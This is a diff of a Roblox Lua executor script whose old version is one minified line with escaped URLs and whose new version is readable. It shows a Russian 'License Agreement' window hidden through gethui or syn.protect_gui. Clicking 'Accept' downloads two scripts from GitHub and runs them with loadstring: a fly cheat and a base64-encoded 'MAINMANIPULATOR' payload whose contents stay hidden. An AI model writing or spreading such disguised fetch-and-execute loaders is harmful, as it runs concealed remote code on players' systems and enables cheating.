@@ -1,1 +1,145 @@
-local _1=game:GetService("CoreGui")local function _2(_3)if buffer and buffer.frombase64 then local _4,_5=pcall(function()return buffer.tostring(buffer.frombase64(_3))end)if _4 and _5 then return _5 end end if typeof(crypt)=="table" and crypt.base64decode then return crypt.base64decode(_3)elseif typeof(base64)=="table" and base64.decode then return base64.decode(_3)end local _6='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'local _7={}for _8=1,#_6 do _7[_6:byte(_8)]=_8-1 end local _9=string.gsub(_3,'[^'.._6..'=]','')local _10={}for _11=1,#_9,4 do local _12,_13,_14,_15=_9:byte(_11,_11+3)if not _12 then break end local _16=(_12 and _7[_12])or 0 local _17=(_13 and _7[_13])or 0 local _18=(_14 and _7[_14])or 0 local _19=(_15 and _7[_15])or 0 local _20=bit32 and bit32.bor(bit32.lshift(_16,2),bit32.rshift(_17,4))or(_16*4+math.floor(_17/16))table.insert(_10,string.char(_20))if _14 and _14~=61 then local _21=bit32 and bit32.bor(bit32.lshift(bit32.band(_17,15),4),bit32.rshift(_18,2))or((_17%16)*16+math.floor(_18/4))table.insert(_10,string.char(_21))end if _15 and _15~=61 then local _22=bit32 and bit32.bor(bit32.lshift(bit32.band(_18,3),6),_19)or((_18%4)*64+_19)table.insert(_10,string.char(_22))end end return table.concat(_10)end local function _23()task.spawn(function()pcall(function()local _24=game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\88\78\69\79\70\70\47\70\108\121\71\117\105\86\51\47\109\97\105\110\47\70\108\121\71\117\105\86\51\46\116\120\116")local _25=loadstring(_24)if _25 then _25()end end)end)task.spawn(function()pcall(function()local _26=game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\67\82\69\69\80\45\102\109\103\47\77\65\73\78\83\67\82\73\80\84\83\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\77\65\73\78\77\65\78\73\80\85\76\65\84\79\82\46\84\88\84")local _27=_2(_26)local _28=loadstring(_27)if _28 then _28()end end)end)end local _29=Instance.new("ScreenGui")_29.Name="LicenseAgreementGui"_29.ResetOnSpawn=false if gethui then _29.Parent=gethui()elseif syn and syn.protect_gui then syn.protect_gui(_29)_29.Parent=_1 else _29.Parent=_1 end local _30=Instance.new("Frame")_30.Size=UDim2.new(0,440,0,340)_30.Position=UDim2.new(0.5,-220,0.5,-170)_30.BackgroundColor3=Color3.fromRGB(24,24,24)_30.BorderSizePixel=0 _30.Parent=_29 local _31=Instance.new("UICorner")_31.CornerRadius=UDim.new(0,8)_31.Parent=_30 local _32=Instance.new("TextLabel")_32.Size=UDim2.new(1,0,0,40)_32.BackgroundTransparency=1 _32.Text="Лицензионное Соглашение"_32.TextColor3=Color3.fromRGB(255,255,255)_32.TextSize=18 _32.Font=Enum.Font.SourceSansBold _32.Parent=_30 local _33=Instance.new("ScrollingFrame")_33.Size=UDim2.new(1,-20,1,-95)_33.Position=UDim2.new(0,10,0,40)_33.BackgroundColor3=Color3.fromRGB(15,15,15)_33.BorderSizePixel=0 _33.ScrollBarThickness=6 _33.CanvasSize=UDim2.new(0,0,0,0)_33.AutomaticCanvasSize=Enum.AutomaticSize.Y _33.Parent=_30 local _34=Instance.new("UICorner")_34.CornerRadius=UDim.new(0,4)_34.Parent=_33 local _35=Instance.new("TextLabel")_35.Size=UDim2.new(1,-12,0,0)_35.Position=UDim2.new(0,6,0,6)_35.BackgroundTransparency=1 _35.Text="Загрузка лицензии..."_35.TextColor3=Color3.fromRGB(220,220,220)_35.TextSize=14 _35.Font=Enum.Font.SourceSans _35.TextWrapped=true _35.AutomaticSize=Enum.AutomaticSize.Y _35.TextXAlignment=Enum.TextXAlignment.Left _35.TextYAlignment=Enum.TextYAlignment.Top _35.Parent=_33 local _36=Instance.new("TextButton")_36.Size=UDim2.new(0,160,0,36)_36.Position=UDim2.new(0.5,-80,1,-45)_36.BackgroundColor3=Color3.fromRGB(40,160,80)_36.Text="Принять"_36.TextColor3=Color3.fromRGB(255,255,255)_36.TextSize=16 _36.Font=Enum.Font.SourceSansBold _36.Parent=_30 local _37=Instance.new("UICorner")_37.CornerRadius=UDim.new(0,6)_37.Parent=_36 task.spawn(function()local _38,_39=pcall(function()return game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\67\82\69\69\80\45\102\109\103\47\77\65\73\78\83\67\82\105\80\84\83\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\76\73\67\69\78\83\69")end)if _38 and _39 and #_39>0 then _35.Text=_39 else _35.Text="Не удалось загрузить текст лицензионного соглашения.\nПроверьте подключение к сети." end end)_36.MouseButton1Click:Connect(function()_29:Destroy()_23()end)
+local A = game:GetService("CoreGui")
+
+local function B(C)
+    if buffer and buffer.frombase64 then
+        local D, E = pcall(function() return buffer.tostring(buffer.frombase64(C)) end)
+        if D and E then return E end
+    end
+    if typeof(crypt) == "table" and crypt.base64decode then return crypt.base64decode(C)
+    elseif typeof(base64) == "table" and base64.decode then return base64.decode(C) end
+    
+    local F = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+    local G = {}
+    for H = 1, #F do G[F:byte(H)] = H - 1 end
+    
+    local I = string.gsub(C, "[^" .. F .. "=]", "")
+    local J = {}
+    
+    for K = 1, #I, 4 do
+        local L, M, N, O = I:byte(K, K + 3)
+        if not L then break end
+        
+        local P = (L and G[L]) or 0
+        local Q = (M and G[M]) or 0
+        local R = (N and G[N]) or 0
+        local S = (O and G[O]) or 0
+        
+        local T = bit32 and bit32.bor(bit32.lshift(P, 2), bit32.rshift(Q, 4)) or (P * 4 + math.floor(Q / 16))
+        table.insert(J, string.char(T))
+        
+        if N and N ~= 61 then
+            local U = bit32 and bit32.bor(bit32.lshift(bit32.band(Q, 15), 4), bit32.rshift(R, 2)) or ((Q % 16) * 16 + math.floor(R / 4))
+            table.insert(J, string.char(U))
+        end
+        
+        if O and O ~= 61 then
+            local V = bit32 and bit32.bor(bit32.lshift(bit32.band(R, 3), 6), S) or ((R % 4) * 64 + S)
+            table.insert(J, string.char(V))
+        end
+    end
+    return table.concat(J)
+end
+
+local function W()
+    task.spawn(function()
+        pcall(function()
+            local X = game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt")
+            local Y = loadstring(X)
+            if Y then Y() end
+        end)
+    end)
+    task.spawn(function()
+        pcall(function()
+            local Z = game:HttpGet("https://raw.githubusercontent.com/CREEP-fmg/MAINSCRIPTS/refs/heads/main/MAINMANIPULATOR.TXT")
+            local _1 = B(Z)
+            local _2 = loadstring(_1)
+            if _2 then _2() end
+        end)
+    end)
+end
+
+local _3 = Instance.new("ScreenGui")
+_3.Name = "LicenseAgreementGui"
+_3.ResetOnSpawn = false
+
+if gethui then _3.Parent = gethui()
+elseif syn and syn.protect_gui then syn.protect_gui(_3); _3.Parent = A
+else _3.Parent = A end
+
+local _4 = Instance.new("Frame")
+_4.Size = UDim2.new(0, 440, 0, 340)
+_4.Position = UDim2.new(0.5, -220, 0.5, -170)
+_4.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
+_4.BorderSizePixel = 0
+_4.Parent = _3
+
+local _5 = Instance.new("UICorner")
+_5.CornerRadius = UDim.new(0, 8)
+_5.Parent = _4
+
+local _6 = Instance.new("TextLabel")
+_6.Size = UDim2.new(1, 0, 0, 40)
+_6.BackgroundTransparency = 1
+_6.Text = "Лицензионное Соглашение"
+_6.TextColor3 = Color3.fromRGB(255, 255, 255)
+_6.TextSize = 18
+_6.Font = Enum.Font.SourceSansBold
+_6.Parent = _4
+
+local _7 = Instance.new("ScrollingFrame")
+_7.Size = UDim2.new(1, -20, 1, -95)
+_7.Position = UDim2.new(0, 10, 0, 40)
+_7.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+_7.BorderSizePixel = 0
+_7.ScrollBarThickness = 6
+_7.CanvasSize = UDim2.new(0, 0, 0, 0)
+_7.AutomaticCanvasSize = Enum.AutomaticSize.Y
+_7.Parent = _4
+
+local _8 = Instance.new("UICorner")
+_8.CornerRadius = UDim.new(0, 4)
+_8.Parent = _7
+
+local _9 = Instance.new("TextLabel")
+_9.Size = UDim2.new(1, -12, 0, 0)
+_9.Position = UDim2.new(0, 6, 0, 6)
+_9.BackgroundTransparency = 1
+_9.Text = "Загрузка лицензии..."
+_9.TextColor3 = Color3.fromRGB(220, 220, 220)
+_9.TextSize = 14
+_9.Font = Enum.Font.SourceSans
+_9.TextWrapped = true
+_9.AutomaticSize = Enum.AutomaticSize.Y
+_9.TextXAlignment = Enum.TextXAlignment.Left
+_9.TextYAlignment = Enum.TextYAlignment.Top
+_9.Parent = _7
+
+local _10 = Instance.new("TextButton")
+_10.Size = UDim2.new(0, 160, 0, 36)
+_10.Position = UDim2.new(0.5, -80, 1, -45)
+_10.BackgroundColor3 = Color3.fromRGB(40, 160, 80)
+_10.Text = "Принять"
+_10.TextColor3 = Color3.fromRGB(255, 255, 255)
+_10.TextSize = 16
+_10.Font = Enum.Font.SourceSansBold
+_10.Parent = _4
+
+local _11 = Instance.new("UICorner")
+_11.CornerRadius = UDim.new(0, 6)
+_11.Parent = _10
+
+task.spawn(function()
+    local _12, _13 = pcall(function()
+        return game:HttpGet("https://raw.githubusercontent.com/CREEP-fmg/MAINSCRIPTS/refs/heads/main/LICENSE")
+    end)
+    if _12 and _13 and #_13 > 0 then
+        _9.Text = _13
+    else
+        _9.Text = "Не удалось загрузить текст лицензионного соглашения.\nПроверьте подключение к сети."
+    end
+end)
+
+_10.MouseButton1Click:Connect(function()
+    _3:Destroy()
+    W()
+end)
